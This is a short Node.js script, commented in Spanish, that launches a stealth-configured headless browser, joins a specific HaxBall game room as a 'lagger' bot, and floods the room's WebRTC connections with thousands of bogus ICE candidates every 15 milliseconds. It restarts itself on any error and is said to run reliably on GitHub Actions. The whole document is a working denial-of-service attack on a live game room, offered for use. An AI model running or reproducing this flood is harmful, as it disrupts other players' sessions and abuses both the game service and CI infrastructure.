// archivo.js → 100% estable en GitHub Actions
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const ROOM = "https://www.haxball.com/?room=HTEUs83jHaw";
const NICK = "lagger" + Math.floor(Math.random() * 9999);

(async () => {
  while (true) {
    let browser;
    try {
      browser = await puppeteer.launch({
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
      });

      const page = await browser.newPage();
      await page.goto(ROOM, { waitUntil: 'networkidle0', timeout: 0 });

      const frame = await page.frames().find(f => f.url().includes('haxball.com/headless'));

      if (!frame) throw new Error("Iframe no encontrado");

      await frame.waitForSelector('input[data-hook="input"]', { timeout: 15000 });
      await frame.type('input[data-hook="input"]', NICK, { delay: 50 });
      
      // Así NUNCA falla el Enter en GitHub Actions
      await frame.evaluate(() => {
        const input = document.querySelector('input[data-hook="input"]');
        if (input) input.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true }));
      });

      console.log(`[+] ${NICK} entró → empezando flood...`);
      await page.waitForTimeout(10000);

      // FLOOD BESTIAL (2000 candidatos cada 15ms)
      setInterval(() => {
        page.evaluate(() => {
          for (let key in window) {
            const pc = window[key];
            if (pc && typeof pc.addIceCandidate === "function") {
              for (let i = 0; i < 2000; i++) {
                pc.addIceCandidate({
                  candidate: "candidate:1 1 udp 1 0.0.0.0 1 typ host",
                  sdpMid: null,
                  sdpMLineIndex: 999
                }).catch(() => {});
              }
            }
          }
        }).catch(() => {});
      }, 15);

      await new Promise(() => {}); // nunca termina

    } catch (err) {
      console.log("[-] Error, reiniciando en 4s...", err.message);
      if (browser) await browser.close();
      await new Promise(r => setTimeout(r, 4000));
    }
  }
})();
